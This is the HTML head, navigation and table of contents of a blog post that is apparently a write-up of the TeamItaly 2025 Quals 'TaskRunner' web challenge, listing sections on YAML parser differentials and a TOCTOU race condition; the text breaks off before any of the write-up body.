<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>TeamItaly 2025 Quals - TaskRunner &#183; simonedimaria's blog</title><meta name=title content="TeamItaly 2025 Quals - TaskRunner &#183; simonedimaria's blog"><meta name=description content='Writeup for the TeamItaly 2025 Quals web challenge "TaskRunner".'><meta name=keywords content="parser-differentials,TOCTOU,race-condition,"><link rel=canonical href=https://simonedimaria.xyz/posts/teamitaly-quals-2025/taskrunner/><meta name=author content="simonedimaria"><link href=https://x.com/dimariasimone rel=me><link href=https://github.com/simonedimaria rel=me><meta property="og:url" content="https://simonedimaria.xyz/posts/teamitaly-quals-2025/taskrunner/"><meta property="og:site_name" content="simonedimaria's blog"><meta property="og:title" content="TeamItaly 2025 Quals - TaskRunner"><meta property="og:description" content="Writeup for the TeamItaly 2025 Quals web challenge ‚ÄúTaskRunner‚Äù."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-06-10T00:00:00+01:00"><meta property="article:modified_time" content="2025-06-10T00:00:00+01:00"><meta property="article:tag" content="Parser-Differentials"><meta property="article:tag" content="TOCTOU"><meta property="article:tag" content="Race-Condition"><meta property="og:image" content="https://simonedimaria.xyz/posts/teamitaly-quals-2025/taskrunner/featured_taskrunner.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://simonedimaria.xyz/posts/teamitaly-quals-2025/taskrunner/featured_taskrunner.png"><meta name=twitter:title content="TeamItaly 2025 Quals - TaskRunner"><meta name=twitter:description content="Writeup for the TeamItaly 2025 Quals web challenge ‚ÄúTaskRunner‚Äù."><link type=text/css rel=stylesheet href=/css/main.bundle.min.d1c3ed04af9c541a143b91860ca6fe24666aa88d10aab65acc4461f6cc04374f8fa72657c9d54c6dacd0c614e8a05f7b566106bfc06b5a75f9b8f888e083a834.css integrity="sha512-0cPtBK+cVBoUO5GGDKb+JGZqqI0QqrZazERh9swEN0+PpyZXydVMbazQxhTooF97VmEGv8BrWnX5uPiI4IOoNA=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script type=text/javascript src=/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js integrity="sha512-mBTe6WFNMq61YjnRGO3+IKzWIxQk+bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js integrity="sha512-vdp97ObLrwje730lT3+ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w==" data-copy=Copy data-copied=Copied></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Blog","name":"TeamItaly 2025 Quals - TaskRunner","headline":"TeamItaly 2025 Quals - TaskRunner","inLanguage":"en","url":"https://simonedimaria.xyz/posts/teamitaly-quals-2025/taskrunner/","author":{"@type":"Person","name":"simonedimaria"},"copyrightYear":"2025","dateCreated":"2025-06-10T00:00:00\u002b01:00","datePublished":"2025-06-10T00:00:00\u002b01:00","dateModified":"2025-06-10T00:00:00\u002b01:00","keywords":["parser-differentials","TOCTOU","race-condition"],"mainEntityOfPage":"true","wordCount":"3802"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl backdrop-saturate-220 backdrop-brightness-112 dark:backdrop-saturate-180 dark:backdrop-brightness-95 bg-primary-200/80 bg-linear-60 dark:bg-primary-800/30 shadow-xl"></div><div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32"><div class="main-menu flex items-center w-full gap-2 p-1 pl-0"><a href=/ class="text-base font-medium truncate min-w-0 shrink">simonedimaria&rsquo;s blog</a><div class="flex items-center ms-auto"><div class="hidden md:flex"><nav class="flex items-center gap-x-5 h-12"><a href=/posts/ class="flex items-center bf-icon-color-hover" aria-label=Blog title=Blog><span class="text-base font-medium break-normal">Blog
</span></a><a href=/tags/ class="flex items-center bf-icon-color-hover" aria-label=Tags title=Tags><span class="text-base font-medium break-normal">Tags
</span></a><a href=https://x.com/dimariasimone target=_blank class="flex items-center bf-icon-color-hover" aria-label=x-twitter title><span><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</span></a><a href=https://github.com/simonedimaria target=_blank class="flex items-center bf-icon-color-hover" aria-label=github title><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a href class="flex items-center bf-icon-color-hover" title></a><button id=search-button aria-label=Search class="text-base bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base bf-icon-color-hover"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav></div><div class="flex md:hidden"><div class="flex items-center h-14 gap-4"><button id=search-button-mobile aria-label=Search class="flex items-center justify-center bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile type=button aria-label="Dark mode switcher" class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400"><div class=dark:hidden><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden dark:block"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button>
<input type=checkbox id=mobile-menu-toggle autocomplete=off class="hidden peer">
<label for=mobile-menu-toggle class="flex items-center justify-center cursor-pointer bf-icon-color-hover"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></label><div role=dialog aria-modal=true style=scrollbar-gutter:stable class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
bf-scrollbar"><label for=mobile-menu-toggle class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></label><nav class="mx-auto max-w-md space-y-6"><div class=px-2><a href=/posts/ aria-label=Blog class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Blog class="text-2xl font-bold tracking-tight">Blog</span></a></div><div class=px-2><a href=/tags/ aria-label=Tags class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Tags class="text-2xl font-bold tracking-tight">Tags</span></a></div><div class=px-2><a href=https://x.com/dimariasimone aria-label=x-twitter target=_blank class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span class="flex items-center justify-center h-8 w-8 text-2xl"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</span><span title class="text-2xl font-bold tracking-tight"></span></a></div><div class=px-2><a href=https://github.com/simonedimaria aria-label=github target=_blank class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span class="flex items-center justify-center h-8 w-8 text-2xl"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span><span title class="text-2xl font-bold tracking-tight"></span></a></div><div class=px-2><a href class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title class="text-2xl font-bold tracking-tight"></span></a></div></nav></div></div></div></div></div><script>(function(){var t,n,e=document.querySelector(".main-menu");if(!e)return;t=window.location.pathname,n=e.querySelectorAll('a[href="'+t+'"]'),n.forEach(function(e){var t=e.querySelectorAll("span");t.forEach(function(e){e.classList.add("active")})})})()</script></div></div><script type=text/javascript src=/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W+5DcKnbOMMOI+f7IvMGNsVvUfj+ooJ13n6EqqcGEz2FKMVvHLGwWPQ==" data-blur-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><figure><img src=/posts/teamitaly-quals-2025/taskrunner/featured_taskrunner_hu_241b6b9e88bd2840.png alt="TeamItaly 2025 Quals - TaskRunner" loading=eager decoding=async fetchpriority=high class="w-full rounded-lg single_hero_round nozoom"></figure><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/></a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Blog</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/teamitaly-quals-2025/taskrunner/>TeamItaly 2025 Quals - TaskRunner</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">TeamItaly 2025 Quals - TaskRunner</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-06-10T00:00:00+01:00>10 June 2025</time><span class="px-2 text-primary-500">&#183;</span><span>3802 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&#183;</span><span class=mb-[2px]>
<span id=zen-mode-button class="text-lg hover:text-primary-500" title="Enable zen mode" data-title-i18n-disable="Enable zen mode" data-title-i18n-enable="Disable zen mode"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentColor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/categories/web/","_self"),!1'><span class=flex style=cursor:pointer><span class="bg-blue-700 rounded-full border-2 border-neutral-200 px-3 py-1 text-sm font-normal text-neutral-200 dark:border-neutral-400 dark:text-neutral-200">üåê Web
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/parser-differentials/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Parser-Differentials
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/toctou/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TOCTOU
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='return window.open("/tags/race-condition/","_self"),!1'><span class=flex style=cursor:pointer><span class="rounded-full border-2 border-primary-400 px-3 py-1 text-sm font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Race-Condition</span></span></span></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4" width=96 height=96 alt=simonedimaria src=/img/gatto-stregone-ciccione_hu_188236a87140fe13.jpeg data-zoom-src=/img/gatto-stregone-ciccione_hu_fb492fc6455199ab.jpeg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">simonedimaria</div><div class="text-sm text-neutral-700 dark:text-neutral-400"><em>I make a bunch of electrons dance on some rock to hack stuff</em></div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://x.com/dimariasimone target=_blank aria-label=X-Twitter title=X-Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span></a>
<a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/simonedimaria target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#challenge-scenario>Challenge scenario</a></li><li><a href=#unintended-solutions-nodejs-go-parsing-differentials>Unintended Solutions: NodeJS-Go Parsing Differentials</a><ul><li><a href=#binary-tag-and-duplicate-keys-by-val><code>!!binary</code> tag and duplicate keys (by @Val)</a></li><li><a href=#unicode-escape-sequences-by-alemmi-sebstr-pysu>Unicode escape sequences (by @Alemmi, @sebstr, @pysu)</a></li><li><a href=#yamls-anchors-and-aliases-my-solution>YAML&rsquo;s Anchors and Aliases (my solution)</a></li></ul></li><li><a href=#intended-solution-toctou-race-condition-in-checktask-by-leveraging-express-fileupload-tempfiles>Intended Solution: TOCTOU race condition in <code>checkTask()</code> by leveraging <code>express-fileupload</code> tempFiles</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#challenge-scenario>Challenge scenario</a></li><li><a href=#unintended-solutions-nodejs-go-parsing-differentials>Unintended Solutions: NodeJS-Go Parsing Differentials</a><ul><li><a href=#binary-tag-and-duplicate-keys-by-val><code>!!binary</code> tag and duplicate keys (by @Val)</a></li><li><a 